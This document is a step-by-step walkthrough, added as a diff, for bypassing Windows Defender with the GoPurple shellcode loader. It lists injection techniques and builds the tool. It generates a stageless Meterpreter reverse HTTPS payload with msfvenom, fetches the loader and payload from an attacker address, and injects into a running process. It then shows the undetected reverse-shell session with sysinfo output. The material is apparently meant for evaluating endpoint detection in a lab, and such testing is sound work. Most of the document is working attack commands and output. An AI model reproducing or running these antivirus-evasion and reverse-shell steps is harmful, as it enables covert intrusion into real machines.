@@ -1,0 +1,246 @@
+===================================================================================================================================================
+AV bypass using the shellcode loader 'GoPurple'
+===================================================================================================================================================
+
+GoPurple is a shellcode loader tool for evaluating detection capabilities of endpoint security solutions.
+
+Source => https://github.com/sh4hin/GoPurple
+
+List of shellcode injection techniques available
+-------------------------------------------------
+1: CreateFiber
+2: syscall
+3: CreateThreadNative
+4: CreateProcess
+5: EtwpCreateEtwThread
+6: CreateRemoteThread
+7: RtlCreateUserThread
+8: CreateThread
+9: CreateRemoteThreadNative
+10: CreateProcessWithPipe
+11: QueueUserAPC
+12: CreateThreadpoolWait
+13: BananaPhone
+14: EnumerateLoadedModules
+15: EnumChildWindows
+16: EnumPageFilesW
+
+Notes regarding AV detection
+-----------------------------
+I tested the tool GoPurple with a metasploit shellcode and several injection techniques on a Windows 10 laptop protected by Windows Defender (AV) enabled and up-to-date.
+Most of the injection techniques were detected by Windows Defender wich deleted the binary "GoPurple.exe" (Suspicious Behavior - Win32/Meterpreter.gen!).
+However the "CreateRemoteThreadNative" shellcode injection technique worked without getting detected nor blocked by Windows Defender (AV).
+
+
+===================================================================================================================================================
+PoC - Example with a stageless Meterpreter (x64) https reverse shell running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+===================================================================================================================================================
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download and compile the tool 'GoPurple'
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools$ cd GoPurple-master/
+
+jeff@kali:~/Documents/Tools/GoPurple-master$ ls
+demo1.gif  demo2.gif  demo3.gif  factory  go.mod  Gopurple.go  go.sum  helpers  README.md  sliv
+
+jeff@kali:~/Documents/Tools/GoPurple-master$ GOOS=windows GOARCH=amd64 go build
+go: downloading github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f
+go: downloading github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4
+../../../go/pkg/mod/github.com/!c-!sto/!banana!phone@v0.0.0-20200831032744-0f0431a7d400/pkg/BananaPhone/internal.go:10:2: missing go.sum entry for module providing package golang.org/x/sys/windows (imported by github.com/sh4hin/GoPurple/techniques); to add:
+        go get github.com/sh4hin/GoPurple/techniques
+        
+jeff@kali:~/Documents/Tools/GoPurple-master$ go get github.com/sh4hin/GoPurple/techniques
+go: downloading golang.org/x/sys v0.0.0-20201018230417-eeed37f84f13
+
+jeff@kali:~/Documents/Tools/GoPurple-master$ GOOS=windows GOARCH=amd64 go build
+
+jeff@kali:~/Documents/Tools/GoPurple-master$ ls -al
+total 10432
+drwxr-xr-x  6 jeff jeff    4096 Mar 12 02:54 .
+drwxr-xr-x 60 jeff jeff    4096 Mar 12 02:45 ..
+-rw-r--r--  1 jeff jeff 1115190 Apr  2  2021 demo1.gif
+-rw-r--r--  1 jeff jeff 1885805 Apr  2  2021 demo2.gif
+-rw-r--r--  1 jeff jeff  212020 Apr  2  2021 demo3.gif
+drwxr-xr-x  2 jeff jeff    4096 Apr  2  2021 factory
+-rw-r--r--  1 jeff jeff       8 Apr  2  2021 .gitignore
+-rw-r--r--  1 jeff jeff     229 Mar 12 02:53 go.mod
+-rwxr-xr-x  1 jeff jeff 7413760 Mar 12 02:54 GoPurple.exe
+-rw-r--r--  1 jeff jeff    1866 Apr  2  2021 Gopurple.go
+-rw-r--r--  1 jeff jeff    1304 Mar 12 02:54 go.sum
+drwxr-xr-x  2 jeff jeff    4096 Apr  2  2021 helpers
+-rw-r--r--  1 jeff jeff    6027 Apr  2  2021 README.md
+drwxr-xr-x  2 jeff jeff    4096 Apr  2  2021 sliverpkg
+drwxr-xr-x  2 jeff jeff    4096 Apr  2  2021 techniques
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a stageless Meterpreter (x64) https reverse shell using Msfvenom
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Saved as: meterpreter.bin
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the signed encrypted payload on a target Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 3/11/2023 5:16:15 PM
+
+
+PS C:\Temp> wget -URI http://192.168.1.30:8080/GoPurple.exe -OutFile GoPurple.exe
+
+PS C:\Temp> .\GoPurple.exe
+
+=============================================================================
+   _____                              _
+  / ____|                            | |
+ | |  __  ___  _ __  _   _ _ __ _ __ | | ___
+ | | |_ |/ _ \| '_ \| | | | '__| '_ \| |/ _ \
+ | |__| | (_) | |_) | |_| | |  | |_) | |  __/
+  \_____|\___/| .__/ \__,_|_|  | .__/|_|\___|
+              | |              | |
+              |_|              |_|   by @s3cdev
+
+
+  -a string
+        Program command line arguments
+  -b string
+        block DLL mode (nonms/onlystore for QueueUserAPC )
+  -p int
+        Process ID to inject shellcode into
+  -prog string
+        program to inject into
+  -t string
+        shellcode injection technique to use:
+         1: CreateFiber
+         2: syscall
+         3: CreateThreadNative
+         4: CreateProcess
+         5: EtwpCreateEtwThread
+         6: CreateRemoteThread
+         7: RtlCreateUserThread
+         8: CreateThread
+         9: CreateRemoteThreadNative
+         10: CreateProcessWithPipe
+         11: QueueUserAPC
+         12: CreateThreadpoolWait
+         13: BananaPhone
+         14: EnumerateLoadedModules
+         15: EnumChildWindows
+         16: EnumPageFilesW
+  -u string
+        URL hosting the shellcode
+        
+        
+PS C:\Temp> .\GoPurple.exe -u http://192.168.1.30:8080/meterpreter.bin -t 9 -p 7336
+
+=============================================================================
+   _____                              _
+  / ____|                            | |
+ | |  __  ___  _ __  _   _ _ __ _ __ | | ___
+ | | |_ |/ _ \| '_ \| | | | '__| '_ \| |/ _ \
+ | |__| | (_) | |_) | |_| | |  | |_) | |  __/
+  \_____|\___/| .__/ \__,_|_|  | .__/|_|\___|
+              | |              | |
+              |_|              |_|   by @s3cdev
+
+
+PS C:\Temp>
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
+set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"
+[sudo] password for jeff: 
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.1.14-dev]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post]
++ -- --=[ 596 payloads - 46 encoders - 10 nops]
++ -- --=[ 9 evasion]
+                                                                                                                                                           
+Metasploit tip: You can upgrade a shell to a Meterpreter
+session on many platforms using sessions -u
+<session_id>
+                                                                                                                                                           
+[*] Starting persistent handler(s)...                                                                                                                      
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+[*] https://192.168.1.30:443 handling request from 192.168.1.144; (UUID: wguwnn1x) Redirecting stageless connection from /vbQylPkfwi3peOh6jXXRhwmgfm_L5awO9zXUOpc0mHDIsgPHF3Sq7iruG4xwnsQdDmtFyTAK7NaZEM7-VLfdhW2_5Hyisjt-vdieVWS with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.30:443 handling request from 192.168.1.144; (UUID: wguwnn1x) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2023-03-12 03:29:21 +0100
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 6...
+
+meterpreter > getuid
+Server username: LAB\auditor
+
+meterpreter > sysinfo
+Computer        : PO744653
+OS              : Windows 10 (10.0 Build 19045).
+Architecture    : x64
+System Language : fr_FR
+Domain          : LAB
+Logged On Users : 23
+Meterpreter     : x64/windows
+
+meterpreter > exit
+<SNIP>
